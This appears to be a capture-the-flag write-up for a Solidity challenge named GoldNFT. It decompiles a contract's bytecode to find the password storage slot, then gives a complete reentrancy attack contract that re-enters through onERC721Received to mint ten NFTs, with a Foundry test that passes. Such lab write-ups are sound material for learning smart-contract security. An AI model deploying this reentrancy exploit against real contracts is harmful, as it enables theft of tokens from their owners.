## GoldNFT

1. The contract GoldNFT has only one function responsible to mint the nft and it requires a password to check for the mint, and mint has reentrancy

2. The problem had hints and the contract adds from which the password is read is preset in the GoldNFT

3. Pasting the bytecode to `https://library.dedaub.com/decompile`

> 0x608060405234801561001057600080fd5b50600436106100365760003560e01c80630daa57031461003b57806361da143914610057575b600080fd5b6100556004803603810190610050919061014a565b610087565b005b610071600480360381019061006c919061018a565b6100c7565b60405161007e91906101c6565b60405180910390f35b600373ffffffffffffffffffffffffffffffffffffffff163373ffffffffffffffffffffffffffffffffffffffff16146100c057600080fd5b8082555050565b6000808254905080915050919050565b600080fd5b6000819050919050565b6100ef816100dc565b81146100fa57600080fd5b50565b60008135905061010c816100e6565b92915050565b60008115159050919050565b61012781610112565b811461013257600080fd5b50565b6000813590506101448161011e565b92915050565b60008060408385031215610161576101606100d7565b5b600061016f858286016100fd565b925050602061018085828601610135565b9150509250929050565b6000602082840312156101a05761019f6100d7565b5b60006101ae848285016100fd565b91505092915050565b6101c081610112565b82525050565b60006020820190506101db60008301846101b7565b9291505056fea264697066735822122061ff97ee8694e327b476b79bd39108c8cea11d9fa876c1c46b11bae8b7afa82564736f6c634300080a0033

4. gives the decompiled functions but we only need to look at the function, the reason is that GoldNFT forwards the arguments to another contract so it only takes bytes32

```
function read(bytes32 varg0) public payable { 
    require(4 + (msg.data.length - 4) - 4 >= 32);
    require(varg0 == varg0);
    return STORAGE[varg0];
}
```

5. Reading this function we get to know that the password that was passed in this is a location to a certain slot that we need and it should return a value whatever it is so that the require condition is satisfied and we get true.


6. Following is the foundry test... which was already given and i added this lines

```
function test_Attack() public {
        vm.startPrank(hacker);
        // solution
        HackGoldNft nftHack = new HackGoldNft(address(nft));
        nftHack.attack();
        assertEq(nft.balanceOf(hacker), 10);
    }
```

7. Here is the hack contract, using the counter to count nft, and re-enter using the `onERC721Received`

```
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface IGoldNFT {
    function takeONEnft(bytes32 password) external;
    function transferFrom(address from, address to, uint256 tokenId) external;
}

contract HackGoldNft is Ownable {
    IGoldNFT goldNft;
    uint256 public counter;

    constructor(address _goldNft) {
        goldNft = IGoldNFT(_goldNft);
    }

    function attack() public {
        goldNft.takeONEnft(0x23ee4bc3b6ce4736bb2c0004c972ddcbe5c9795964cdd6351dadba79a295f5fe);
    }

    // Receive a callback
    function onERC721Received(address operator, address from, uint256 id, bytes calldata data)
        external
        returns (bytes4 response)
    {
        if (counter > 9) return this.onERC721Received.selector;
        require(msg.sender == address(goldNft), "wrong call");
        goldNft.transferFrom(address(this), owner(), id);

        counter++;
        attack();

        return this.onERC721Received.selector;
    }
}
```

8. runnnn `forge test --match-path test/GoldNFT.t.sol -vv` and get lots of warning and 

> Running 1 test for test/GoldNFT.t.sol:Hack
[PASS] test_Attack() (gas: 866241)
Test result: ok. 1 passed; 0 failed; finished in 592.63ms